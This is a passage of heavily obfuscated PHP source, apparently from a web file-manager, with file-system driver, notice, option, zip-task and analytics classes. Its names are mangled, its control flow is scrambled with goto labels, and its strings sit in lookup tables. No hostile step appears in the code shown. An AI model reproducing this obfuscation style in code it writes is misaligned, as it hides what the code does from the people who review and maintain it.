$this->pathFather($eå¹×ÄîĞ); $C»˜ŸË¯Í¸ = rtrim($CŒõÎŠß—, $D¹¿¿‘ÃÖ™[8]) . $D¹¿¿‘ÃÖ™[8] . $dÅå¨ñ¨…; goto AàÆğïºø; a¿Õà‡¼Í: } public function size($Cçªå×¥¿) { $Cçªå×¥¿ = $this->iconvSystem($Cçªå×¥¿); return filesize_64($Cçªå×¥¿); } public function info($Føšä¨···) { $Føšä¨··· = $this->iconvSystem($Føšä¨···); if ($this->isFolder($Føšä¨···)) { return $this->folderInfo($Føšä¨···); } else { if ($this->isFile($Føšä¨···)) { return $this->fileInfo($Føšä¨···); } } return !1; } protected function infoChildren($cÄ°™äÊòÇ, &$E¤ãÕĞÄÂ, $D²í¼¿œØ˜ = true) { goto d‹“…; d‹“…: $fŠ¿…‘ù²ª =& $_SERVER[í¤âËÚ£¶íÊ¢]; check_abort_echo(); $cÄ°™äÊòÇ = rtrim($cÄ°™äÊòÇ, $fŠ¿…‘ù²ª[8]) . $fŠ¿…‘ù²ª[8]; goto B˜µÄ¹ßÓÔ; cÅâÀ–°Ø: closedir($aÄç‰‰ŒëÔ); goto fá˜¥ßŒ¼«; B˜µÄ¹ßÓÔ: if ($D²í¼¿œØ˜) { $cÄ°™äÊòÇ = $this->iconvSystem($cÄ°™äÊòÇ); } if (!($aÄç‰‰ŒëÔ = @opendir($cÄ°™äÊòÇ))) { return; } while (($Fˆ÷ÍÚ° Ú = readdir($aÄç‰‰ŒëÔ)) !== !1) { if ($Fˆ÷ÍÚ° Ú == $fŠ¿…‘ù²ª[104] || $Fˆ÷ÍÚ° Ú == $fŠ¿…‘ù²ª[1211]) { continue; } $BŠÔ´¯êù¶ = $cÄ°™äÊòÇ . $Fˆ÷ÍÚ° Ú; if (is_file($BŠÔ´¯êù¶) || is_link($BŠÔ´¯êù¶)) { $E¤ãÕĞÄÂ[$fŠ¿…‘ù²ª[88]]++; $E¤ãÕĞÄÂ[$fŠ¿…‘ù²ª[87]] += filesize_64($BŠÔ´¯êù¶); } else { if (is_dir($BŠÔ´¯êù¶)) { $E¤ãÕĞÄÂ[$fŠ¿…‘ù²ª[89]]++; $this->infoChildren($BŠÔ´¯êù¶, $E¤ãÕĞÄÂ, !1); } } } goto cÅâÀ–°Ø; fá˜¥ßŒ¼«: } private function folderInfo($fØè¹ØÎ¡, $b¶¨Äñæ = false) { $F™®ÆµÌåË =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fØè¹ØÎ¡ = rtrim($fØè¹ØÎ¡, $F™®ÆµÌåË[8]) . $F™®ÆµÌåË[8]; $A£›îÙñ†å = $this->iconvApp($this->pathThis($fØè¹ØÎ¡)); if ($b¶¨Äñæ) { return array($F™®ÆµÌåË[28] => $A£›îÙñ†å, $F™®ÆµÌåË[85] => $this->getPathOuter($fØè¹ØÎ¡), $F™®ÆµÌåË[29] => $F™®ÆµÌåË[86]); } $AİòÊê¦Ï… = array($F™®ÆµÌåË[28] => $A£›îÙñ†å, $F™®ÆµÌåË[85] => $this->getPathOuter($fØè¹ØÎ¡), $F™®ÆµÌåË[29] => $F™®ÆµÌåË[86], $F™®ÆµÌåË[202] => @filectime($fØè¹ØÎ¡), $F™®ÆµÌåË[93] => @filemtime($fØè¹ØÎ¡), $F™®ÆµÌåË[1214] => @fileatime($fØè¹ØÎ¡), $F™®ÆµÌåË[1215] => is_readable($fØè¹ØÎ¡), $F™®ÆµÌåË[1216] => is_writable($fØè¹ØÎ¡), $F™®ÆµÌåË[1217] => get_mode($fØè¹ØÎ¡)); return $AİòÊê¦Ï…; } private function fileInfo($B®ñ¨« «, $CœÓß¥ÁÂÒ = false) { $AÛ–¯›Ä×ˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÖ¢õ¨ˆæ = $this->iconvApp($this->pathThis($B®ñ¨« «)); if ($CœÓß¥ÁÂÒ) { return array($AÛ–¯›Ä×ˆ[28] => $dÖ¢õ¨ˆæ, $AÛ–¯›Ä×ˆ[85] => $this->getPathOuter($B®ñ¨« «), $AÛ–¯›Ä×ˆ[29] => $AÛ–¯›Ä×ˆ[201], $AÛ–¯›Ä×ˆ[87] => $this->size($B®ñ¨« «), $AÛ–¯›Ä×ˆ[177] => $this->ext($dÖ¢õ¨ˆæ)); } $d‹ç¿´›ì½ = array($AÛ–¯›Ä×ˆ[28] => $dÖ¢õ¨ˆæ, $AÛ–¯›Ä×ˆ[85] => $this->getPathOuter($B®ñ¨« «), $AÛ–¯›Ä×ˆ[29] => $AÛ–¯›Ä×ˆ[201], $AÛ–¯›Ä×ˆ[202] => @filectime($B®ñ¨« «), $AÛ–¯›Ä×ˆ[93] => @filemtime($B®ñ¨« «), $AÛ–¯›Ä×ˆ[1214] => @fileatime($B®ñ¨« «), $AÛ–¯›Ä×ˆ[87] => $this->size($B®ñ¨« «), $AÛ–¯›Ä×ˆ[177] => $this->ext($dÖ¢õ¨ˆæ), $AÛ–¯›Ä×ˆ[1215] => is_readable($B®ñ¨« «), $AÛ–¯›Ä×ˆ[1216] => is_writable($B®ñ¨« «), $AÛ–¯›Ä×ˆ[1217] => get_mode($B®ñ¨« «)); return $d‹ç¿´›ì½; } public function exist($EÎŸ¢ÀÀÃÕ) { $EÎŸ¢ÀÀÃÕ = $this->iconvSystem($EÎŸ¢ÀÀÃÕ); return @file_exists($EÎŸ¢ÀÀÃÕ); } public function isFile($f²”×å§Á›) { $f²”×å§Á› = $this->iconvSystem($f²”×å§Á›); return @is_file($f²”×å§Á›); } public function isFolder($Fòìà–ËÈ†) { $Fòìà–ËÈ† = $this->iconvSystem($Fòìà–ËÈ†); return @is_dir($Fòìà–ËÈ†); } public function listPath($fáİ—ÃõÄ, $bá£‹µÇİØ = false) { goto D­•©Æçö²; cÂ¢ÃËÜÌ: $F½¯ÓÒ ”³ = array($d¹õ¿³˜«ª[84] => array(), $d¹õ¿³˜«ª[83] => array()); if (!($F¶¾÷½ÒÛƒ = @opendir($fáİ—ÃõÄ))) { return $F½¯ÓÒ ”³; } while (($f‘–¢†Å›× = readdir($F¶¾÷½ÒÛƒ)) !== !1) { if ($f‘–¢†Å›× == $d¹õ¿³˜«ª[104] || $f‘–¢†Å›× == $d¹õ¿³˜«ª[1211]) { continue; } $C—Ãù¹Ïº¤ = $fáİ—ÃõÄ . $f‘–¢†Å›×; if (is_file($C—Ãù¹Ïº¤)) { $F½¯ÓÒ ”³[$d¹õ¿³˜«ª[83]][] = $this->fileInfo($C—Ãù¹Ïº¤, $bá£‹µÇİØ); } else { $F½¯ÓÒ ”³[$d¹õ¿³˜«ª[84]][] = $this->folderInfo($C—Ãù¹Ïº¤, $bá£‹µÇİØ); } } goto aè›ä¦¢ß; aè›ä¦¢ß: closedir($F¶¾÷½ÒÛƒ); return $F½¯ÓÒ ”³; goto C¬·¹·ÍÆ„; D­•©Æçö²: $d¹õ¿³˜«ª =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fáİ—ÃõÄ = $this->iconvSystem($fáİ—ÃõÄ); $fáİ—ÃõÄ = rtrim($fáİ—ÃõÄ, $d¹õ¿³˜«ª[8]) . $d¹õ¿³˜«ª[8]; goto cÂ¢ÃËÜÌ; C¬·¹·ÍÆ„: } public function listAll($aè’ˆØæ³Ü, &$F†ùÕøç’¸ = array()) { goto D‘¼ÕŒçÇ; Eª‰×±„“ : if (!($b†¹÷ß¥Ö = @opendir($aè’ˆØæ³Ü))) { return $F†ùÕøç’¸; } while (($c±…İ¾¦À = readdir($b†¹÷ß¥Ö)) !== !1) { if ($c±…İ¾¦À == $F»¼—²³äŠ[104] || $c±…İ¾¦À == $F»¼—²³äŠ[1211]) { continue; } $DÎ—‹¿ñ½Ú = $aè’ˆØæ³Ü . $c±…İ¾¦À; if (is_dir($DÎ—‹¿ñ½Ú) && !is_link($DÎ—‹¿ñ½Ú)) { $F†ùÕøç’¸[] = array($F»¼—²³äŠ[85] => $DÎ—‹¿ñ½Ú . $F»¼—²³äŠ[8], $F»¼—²³äŠ[86] => 1, $F»¼—²³äŠ[93] => @filemtime($DÎ—‹¿ñ½Ú), $F»¼—²³äŠ[87] => 0); $this->listAll($DÎ—‹¿ñ½Ú, $F†ùÕøç’¸); } else { $F†ùÕøç’¸[] = array($F»¼—²³äŠ[85] => $DÎ—‹¿ñ½Ú, $F»¼—²³äŠ[86] => 0, $F»¼—²³äŠ[93] => @filemtime($DÎ—‹¿ñ½Ú), $F»¼—²³äŠ[87] => $this->size($DÎ—‹¿ñ½Ú)); } } closedir($b†¹÷ß¥Ö); goto b°‘îÚªÑ¸; D‘¼ÕŒçÇ: $F»¼—²³äŠ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aè’ˆØæ³Ü = $this->iconvSystem($aè’ˆØæ³Ü); $aè’ˆØæ³Ü = rtrim($aè’ˆØæ³Ü, $F»¼—²³äŠ[8]) . $F»¼—²³äŠ[8]; goto Eª‰×±„“ ; b°‘îÚªÑ¸: return $F†ùÕøç’¸; goto Dá«êà»ƒ÷; Dá«êà»ƒ÷: } public function has($b»å—Èù, $e©ë‹õ¨Ò¶ = false, $dóÙÍ»Â…¡ = true) { goto DàºÁøÇ‡¥; DàºÁøÇ‡¥: $eæ¹ƒÆ£ƒğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b»å—Èù = $this->iconvSystem($b»å—Èù); $b»å—Èù = rtrim($b»å—Èù, $eæ¹ƒÆ£ƒğ[8]) . $eæ¹ƒÆ£ƒğ[8]; goto F¼Û¾£ÀÖ; F¼Û¾£ÀÖ: if (!($B–“ƒİ¹†¼ = @opendir($b»å—Èù))) { return !1; } $fÒˆ»ŞÛ×Í = 0; $Cİ„òá¸Î = 0; goto A‚™Ÿ¸”›Á; fœ¦óÚç²æ: if ($e©ë‹õ¨Ò¶) { return array($eæ¹ƒÆ£ƒğ[211] => $fÒˆ»ŞÛ×Í, $eæ¹ƒÆ£ƒğ[212] => $Cİ„òá¸Î); } return !1; goto b…†Ş˜Û¦Ñ; A‚™Ÿ¸”›Á: $fÓ½ÙØÄ¾ = 0; while (($bãÑ‚•¿—á = readdir($B–“ƒİ¹†¼)) !== !1) { if ($bãÑ‚•¿—á == $eæ¹ƒÆ£ƒğ[104] || $bãÑ‚•¿—á == $eæ¹ƒÆ£ƒğ[1211]) { continue; } $EİÂ—¦ä®¹ = $b»å—Èù . $bãÑ‚•¿—á; if ($e©ë‹õ¨Ò¶) { $fÓ½ÙØÄ¾++; if (@is_file($EİÂ—¦ä®¹)) { $fÒˆ»ŞÛ×Í++; } else { $Cİ„òá¸Î++; } if ($fÓ½ÙØÄ¾ > 10000) { break; } continue; } if ($dóÙÍ»Â…¡) { if (@is_file($EİÂ—¦ä®¹)) { return !0; } } else { if (@is_dir($EİÂ—¦ä®¹ . $eæ¹ƒÆ£ƒğ[8])) { return !0; } } } closedir($B–“ƒİ¹†¼); goto fœ¦óÚç²æ; b…†Ş˜Û¦Ñ: } public function hashSimple($E¦Êğ°Ó— ) { goto EÌ‘„šÂÂâ; fÕğÙ½Éš¤: $Aø èõ¯ø = $this->size($E¦Êğ°Ó— ); $FÀ’”ÂÅïé = 200; $C³°ÑÓö¤ = 50; goto B¥«»ÎÓ¯§; Bàæ‹ñÕÇ†: $D£ßÏïÜ Œ = fopen($E¦Êğ°Ó— , $c…«…†¡ÉŞ[1218]); if (!$D£ßÏïÜ Œ) { return $cİ˜Ê­ï¹; } for ($EÌÅ‹Ù³‚‘ = 0; $EÌÅ‹Ù³‚‘ < $C³°ÑÓö¤; $EÌÅ‹Ù³‚‘++) { fseek_64($D£ßÏïÜ Œ, $d«±Çµà‹Ò * $EÌÅ‹Ù³‚‘); $cİ˜Ê­ï¹ .= fread($D£ßÏïÜ Œ, $FÀ’”ÂÅïé); } goto eöè„åá·Ä; eöè„åá·Ä: fseek_64($D£ßÏïÜ Œ, $Aø èõ¯ø - $FÀ’”ÂÅïé); $cİ˜Ê­ï¹ .= fread($D£ßÏïÜ Œ, $FÀ’”ÂÅïé); fclose($D£ßÏïÜ Œ); goto Fİö¦¼¨ĞÄ; B¥«»ÎÓ¯§: if ($Aø èõ¯ø <= $FÀ’”ÂÅïé * $C³°ÑÓö¤) { return $this->hashMd5($E¦Êğ°Ó— ) . $Aø èõ¯ø; } $cİ˜Ê­ï¹ = $c…«…†¡ÉŞ[33]; $d«±Çµà‹Ò = intval($Aø èõ¯ø / $C³°ÑÓö¤); goto Bàæ‹ñÕÇ†; EÌ‘„šÂÂâ: $c…«…†¡ÉŞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$E¦Êğ°Ó— ) { return md5($c…«…†¡ÉŞ[33]); } $E¦Êğ°Ó—  = $this->iconvSystem($E¦Êğ°Ó— ); goto fÕğÙ½Éš¤; Fİö¦¼¨ĞÄ: return md5($cİ˜Ê­ï¹) . $Aø èõ¯ø; goto BÆó¨–ºÊ·; BÆó¨–ºÊ·: } public function getContent($a¶ãÚ¢˜È©) { $a¶ãÚ¢˜È© = $this->iconvSystem($a¶ãÚ¢˜È©); return file_get_contents($a¶ãÚ¢˜È©); } public function setContent($AÉãÊÌé, $B…¶Æ¢ôŒİ = '') { $AÉãÊÌé = $this->iconvSystem($AÉãÊÌé); $cöù‡¬Ö… = @file_put_contents($AÉãÊÌé, $B…¶Æ¢ôŒİ, LOCK_EX); clearstatcache(); return $cöù‡¬Ö… === !1 ? !1 : !0; } public function fileSubstr($cŒÛ¨÷«, $d™ƒÍà–Şµ = 0, $cîÃ§†‰õ‚ = false) { goto eŞ÷áíÍÖ¬; AÇ†œİ÷¥Õ: if ($cîÃ§†‰õ‚ <= 0) { return $eçÓƒ Î¯[33]; } $A¨ÔÑà„øô = fopen($cŒÛ¨÷«, $eçÓƒ Î¯[1218]); if (!$A¨ÔÑà„øô) { return !1; } goto Aíïãší; eŞ÷áíÍÖ¬: $eçÓƒ Î¯ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cŒÛ¨÷« = $this->iconvSystem($cŒÛ¨÷«); if ($cîÃ§†‰õ‚ === !1) { $cîÃ§†‰õ‚ = $this->size($cŒÛ¨÷«); } goto AÇ†œİ÷¥Õ; Aíïãší: fseek_64($A¨ÔÑà„øô, $d™ƒÍà–Şµ); $bÁÑ†‰íö = fread($A¨ÔÑà„øô, $cîÃ§†‰õ‚); fclose($A¨ÔÑà„øô); goto E‡ÏàˆÃ£›; E‡ÏàˆÃ£›: return $bÁÑ†‰íö; goto a±Œ—ˆ’‰…; a±Œ—ˆ’‰…: } public function upload($Cé¿ÕĞĞ¡å, $Eˆ¡°ÖŒÕ¹, $C ÀŸ•èĞã = false, $F­Êâæ°‰‚ = REPEAT_REPLACE) { $Bº«…ßšÁï = $this->copyFile($Eˆ¡°ÖŒÕ¹, $Cé¿ÕĞĞ¡å); return $Bº«…ßšÁï ? $this->getPathOuter($Cé¿ÕĞĞ¡å) : !1; } public function setModifyTime($c§ø»¤´ğé, $b±ë¢ƒ­ĞÇ = '') { @touch($c§ø»¤´ğé, intval($b±ë¢ƒ­ĞÇ)); } public function download($FØİÀ ª¼Å, $E‰È…ÂòÒÈ) { return $this->iconvSystem($FØİÀ ª¼Å); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DÎù“´‚”à) { parent::__construct($DÎù“´‚”à); $this->signatureVersion($_SERVER[í¤âËÚ£¶íÊ¢][220]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto B‘ÔØ£ˆÍ¾; Eåï¼¾£ç: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x6e\x6f\164\151\x63\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\145", "\x63\157\x6e\x74\x65\x6e\x74", "\141\x75\x74\150", "\155\x6f\144\145", "\x74\x69\155\x65", "\x74\171\160\x65", "\154\x65\166\145\154", "\145\156\141\142\154\x65", "\x73\157\162\164"); public function listData($aã‚…ßùïˆ = false, $E¬¤‰ŒØ¡‘ = "\x73\x6f\162\164", $dÏõ¦“¼£ï = false) { return parent::listData($aã‚…ßùïˆ, $E¬¤‰ŒØ¡‘, $dÏõ¦“¼£ï); } public function add($F„çïàÜÎ) { $bøÓŒµ§ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÅèƒ¥›Ô = time(); if ($F„çïàÜÎ[$bøÓŒµ§[12]] == $bøÓŒµ§[2056]) { $dÅèƒ¥›Ô = strtotime($F„çïàÜÎ[$bøÓŒµ§[205]]); } $F„çïàÜÎ[$bøÓŒµ§[205]] = $dÅèƒ¥›Ô; return parent::insert($F„çïàÜÎ); } public function update($BÄ°¼›ÈÖÌ, $Dğ¬ƒ£Ääí) { goto F‡•ÕÛº¥ñ; F‡•ÕÛº¥ñ: $FëĞ’ÒŒéä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÛîëáÄÓº = $this->listData($BÄ°¼›ÈÖÌ); if (!$dÛîëáÄÓº) { return !1; } goto A½Ñô¬¬é; A½Ñô¬¬é: $a÷“–Øå¶Š = time(); if ($Dğ¬ƒ£Ääí[$FëĞ’ÒŒéä[12]] == $FëĞ’ÒŒéä[2056]) { $a÷“–Øå¶Š = strtotime($Dğ¬ƒ£Ääí[$FëĞ’ÒŒéä[205]]); } $Dğ¬ƒ£Ääí[$FëĞ’ÒŒéä[205]] = $a÷“–Øå¶Š; goto BöŒË´Ü´·; BöŒË´Ü´·: return parent::update($BÄ°¼›ÈÖÌ, $Dğ¬ƒ£Ääí); goto A»ê²•îº‚; A»ê²•îº‚: } public function remove($cˆ¯‹´Ïï) { $Bƒë†«² = $this->listData($cˆ¯‹´Ïï); if (!$Bƒë†«² || $Bƒë†«²[$_SERVER[í¤âËÚ£¶íÊ¢][1129]]) { return !1; } return parent::remove($cˆ¯‹´Ïï); } public function sort($D×©êÔìÀ¨, $DäõƒÊ–â) { return parent::update($D×©êÔìÀ¨, $DäõƒÊ–â); } public function enable($E‡¸«Ö÷Ã·, $DÒÖ”Ï ) { return parent::update($E‡¸«Ö÷Ã·, array($_SERVER[í¤âËÚ£¶íÊ¢][2057] => $DÒÖ”Ï )); } private function initUserOption() { $dÄòò¹ÁÇ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->optionType = $dÄòò¹ÁÇ[2058]; $this->modelType = $dÄòò¹ÁÇ[2059]; $this->field = array($dÄòò¹ÁÇ[2060], $dÄòò¹ÁÇ[28], $dÄòò¹ÁÇ[205], $dÄòò¹ÁÇ[29], $dÄòò¹ÁÇ[2061], $dÄòò¹ÁÇ[694], $dÄòò¹ÁÇ[198]); } public function userNoticeGet($BÃ‘‚áå¦ = false) { $this->initUserOption(); return parent::listData($BÃ‘‚áå¦, $_SERVER[í¤âËÚ£¶íÊ¢][397], !0); } public function userNoticeAdd($DÊŒ¸“ŞÁî) { $Eš²Ö¤Û =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initUserOption(); $e—¦ó¬ˆ‡¿ = $this->findByKey($Eš²Ö¤Û[2060], $DÊŒ¸“ŞÁî[$Eš²Ö¤Û[397]]); if ($e—¦ó¬ˆ‡¿) { return !0; } $D™…¥á‚¨ò = array($Eš²Ö¤Û[2060] => $DÊŒ¸“ŞÁî[$Eš²Ö¤Û[397]], $Eš²Ö¤Û[28] => $DÊŒ¸“ŞÁî[$Eš²Ö¤Û[28]], $Eš²Ö¤Û[205] => $DÊŒ¸“ŞÁî[$Eš²Ö¤Û[205]], $Eš²Ö¤Û[29] => isset($DÊŒ¸“ŞÁî[$Eš²Ö¤Û[29]]) ? $DÊŒ¸“ŞÁî[$Eš²Ö¤Û[29]] : 1, $Eš²Ö¤Û[2061] => isset($DÊŒ¸“ŞÁî[$Eš²Ö¤Û[2061]]) ? $DÊŒ¸“ŞÁî[$Eš²Ö¤Û[2061]] : 0, $Eš²Ö¤Û[694] => 0, $Eš²Ö¤Û[198] => 0); return parent::insert($D™…¥á‚¨ò); } public function userNoticeEdit($A×°ÕÌô, $b†õåÖ”™å) { $this->initUserOption(); return parent::update($A×°ÕÌô, $b†õåÖ”™å); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\x6d\x5f\157\160\x74\x69\157\156"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\x6f\154\145", "\162\157\x6c\x65\x47\162\157\165\x70", "\x72\145\147\x69\x73\164", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($bù·èŸÉ­°) { return "\x53\171\163\164\145\x6d\117\160\164\151\x6f\x6e\137{$bù·èŸÉ­°}"; } protected function optionDefault($B›îôÏ·ö… = '') { $Aµ°ğŠ×İ‹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($B›îôÏ·ö… == $Aµ°ğŠ×İ‹[33]) { return $GLOBALS[$Aµ°ğŠ×İ‹[6]][$Aµ°ğŠ×İ‹[385]]; } } } class SystemRecordModel extends ModelBaseLight { } goto cØ‹¾ÃÙêÏ; e‘Ì‚‰øš¼: class TaskZip extends TaskFileTransfer { protected function startAfter() { $fÚ‡“ßĞñÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; parent::startAfter(); Hook::bind($fÚ‡“ßĞñÖ[1574], array($this, $fÚ‡“ßĞñÖ[1569])); $C Ğğ•– =& $this->task; $C Ğğ•–[$fÚ‡“ßĞñÖ[1571]] = $fÚ‡“ßĞñÖ[1054]; if (!$C Ğğ•–[$fÚ‡“ßĞñÖ[1393]]) { $C Ğğ•–[$fÚ‡“ßĞñÖ[1393]] = LNG($fÚ‡“ßĞñÖ[1575]); } } protected function endAfter() { $aµ¾õÕ–Õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; parent::endAfter(); Hook::unbind($aµ¾õÕ–Õ[1574], array($this, $aµ¾õÕ–Õ[1569])); } public function updateAfter() { $E¨‘ÄÀº©µ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D­ƒ„Ô‚³ä =& $this->task; if (!$D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[982]] || !$D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[703]]) { return; } if ($D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1571]] == $E¨‘ÄÀº©µ[1054]) { $fí®™Œ’ì = $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1531]]; if ($D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1532]] != $E¨‘ÄÀº©µ[1054]) { $fí®™Œ’ì = 0; } $F¹ÛÓ®ƒ¶ó = ($D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1535]] + $fí®™Œ’ì) / $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[703]]; $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1488]] = $F¹ÛÓ®ƒ¶ó * 0.3; } else { if ($D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1571]] == $E¨‘ÄÀº©µ[318]) { $F¹ÛÓ®ƒ¶ó = $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[996]] / $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[982]]; $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1488]] = 0.3 + $F¹ÛÓ®ƒ¶ó * 0.5; } else { if ($D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1571]] == $E¨‘ÄÀº©µ[116]) { $F¹ÛÓ®ƒ¶ó = 0; if ($D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1530]]) { $F¹ÛÓ®ƒ¶ó = $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1531]] / $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1530]]; } $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1488]] = 0.3 + 0.5 + $F¹ÛÓ®ƒ¶ó * 0.2; } } } if ($D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1488]] > 0) { $B½²ì¥¥Ô› = timeFloat() - $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[725]] - $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1491]]; $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1492]] = $B½²ì¥¥Ô› * (1 - $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1488]]) / $D­ƒ„Ô‚³ä[$E¨‘ÄÀº©µ[1488]]; } } public function copyFileStart($F™Ï‚Ë¬‘È, $eÍ©íéÌ‘ò, $eÌß¶‹ùô , $A¹â„¼ã, $D¾‘­µôš, $e´ÒÌÚôÏø) { $AÒáëÑé£ =& $_SERVER[í¤âËÚ£¶íÊ¢]; parent::copyFileStart($F™Ï‚Ë¬‘È, $eÍ©íéÌ‘ò, $eÌß¶‹ùô , $A¹â„¼ã, $D¾‘­µôš, $e´ÒÌÚôÏø); $D×•øöª  =& $this->task; if ($D×•øöª [$AÒáëÑé£[1571]] == $AÒáëÑé£[318]) { $D×•øöª [$AÒáëÑé£[1571]] = $AÒáëÑé£[116]; } $this->update(); } public function copyFileEnd($B‘¸èğ”‹, $bù×Œ¦ÜÒß, $fœµå‰½×, $d¶¼“ˆ÷æ, $d½Û³†Áõ, $EÀ»Á‰µ) { $FÒ¶Ë†³Ïå =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fë–öÊšÖº =& $this->task; $fë–öÊšÖº[$FÒ¶Ë†³Ïå[1531]] = $fë–öÊšÖº[$FÒ¶Ë†³Ïå[1530]]; $fë–öÊšÖº[$FÒ¶Ë†³Ïå[1535]] += $fë–öÊšÖº[$FÒ¶Ë†³Ïå[1530]]; $fë–öÊšÖº[$FÒ¶Ë†³Ïå[1532]] = $FÒ¶Ë†³Ïå[33]; $this->update(); } public function nameParse($e‘ˆ¤à¦“‘) { $cß¦æé¥Æ‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c›Ü¡ã‡òÕ =& $this->task; if ($c›Ü¡ã‡òÕ[$cß¦æé¥Æ‰[996]] < $c›Ü¡ã‡òÕ[$cß¦æé¥Æ‰[982]]) { $aŒ®‰ª·—ë = get_path_this($e‘ˆ¤à¦“‘); if (strstr($aŒ®‰ª·—ë, $cß¦æé¥Æ‰[104])) { $c›Ü¡ã‡òÕ[$cß¦æé¥Æ‰[996]] += 1; } } if ($c›Ü¡ã‡òÕ[$cß¦æé¥Æ‰[1571]] == $cß¦æé¥Æ‰[1054]) { $c›Ü¡ã‡òÕ[$cß¦æé¥Æ‰[1571]] = $cß¦æé¥Æ‰[318]; } $c›Ü¡ã‡òÕ[$cß¦æé¥Æ‰[1528]] = $e‘ˆ¤à¦“‘; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($EŠ¦À¦ëÃ¤) { $fÃÆ³ˆŒÄê =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F™ÂğÑØÜ = array($fÃÆ³ˆŒÄê[566] => array($fÃÆ³ˆŒÄê[29] => $fÃÆ³ˆŒÄê[1576], $fÃÆ³ˆŒÄê[278] => array($fÃÆ³ˆŒÄê[230], $fÃÆ³ˆŒÄê[705], $fÃÆ³ˆŒÄê[1577], $fÃÆ³ˆŒÄê[1578])), $fÃÆ³ˆŒÄê[1579] => array($fÃÆ³ˆŒÄê[29] => $fÃÆ³ˆŒÄê[1580], $fÃÆ³ˆŒÄê[278] => array($fÃÆ³ˆŒÄê[230], $fÃÆ³ˆŒÄê[703], $fÃÆ³ˆŒÄê[1581], $fÃÆ³ˆŒÄê[1582], $fÃÆ³ˆŒÄê[1583]))); if (!isset($F™ÂğÑØÜ[$EŠ¦À¦ëÃ¤])) { return !1; } $this->optionType = $F™ÂğÑØÜ[$EŠ¦À¦ëÃ¤][$fÃÆ³ˆŒÄê[29]]; $this->field = $F™ÂğÑØÜ[$EŠ¦À¦ëÃ¤][$fÃÆ³ˆŒÄê[278]]; return !0; } public function listData($D¹¿âÂÖ = false, $bÆÑ§œäİô = "\155\157\144\x69\x66\x79\124\x69\x6d\x65", $a¥…ÁÊ™Œ = false) { return parent::listData($D¹¿âÂÖ, $bÆÑ§œäİô, $a¥…ÁÊ™Œ); } public function trendList($BÙì¨Û×ñ†) { goto Fõ‘Œ†–Ÿ´; eº†Í”š´È: if (!isset($BÑ‚Ô†æäô)) { $eÂ¢˜‡œ ‰ = $BÙì¨Û×ñ† == $eÒ‹ÛÕÇˆ‹[566] ? $eÒ‹ÛÕÇˆ‹[510] : $eÒ‹ÛÕÇˆ‹[759]; $BÑ‚Ô†æäô = Model($eÂ¢˜‡œ ‰)->min($eÒ‹ÛÕÇˆ‹[202]); } $Cç®‘Á§êŠ = $eÒ‹ÛÕÇˆ‹[1586] . ucfirst($BÙì¨Û×ñ†); $fÙàõ†ĞÉÔ = $this->dateList($BÑ‚Ô†æäô); goto F›×´ÉàÆ; F›×´ÉàÆ: foreach ($fÙàõ†ĞÉÔ as $b¨™Øâ‡ù¼) { $this->{$Cç®‘Á§êŠ}($b¨™Øâ‡ù¼); } return $this->listData(); goto E¥ ËµŒùÒ; Fõ‘Œ†–Ÿ´: $eÒ‹ÛÕÇˆ‹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B¯èéöÒå = $this->listData(); if ($B¯èéöÒå) { $AŞéêëÌ¢á = end($B¯èéöÒå); $b¨™Øâ‡ù¼ = date($eÒ‹ÛÕÇˆ‹[1584], strtotime($eÒ‹ÛÕÇˆ‹[1585])); if ($AŞéêëÌ¢á[$eÒ‹ÛÕÇˆ‹[230]] == $b¨™Øâ‡ù¼) { return $B¯èéöÒå; } $BÑ‚Ô†æäô = strtotime($AŞéêëÌ¢á[$eÒ‹ÛÕÇˆ‹[230]]); } goto eº†Í”š´È; E¥ ËµŒùÒ: } private function 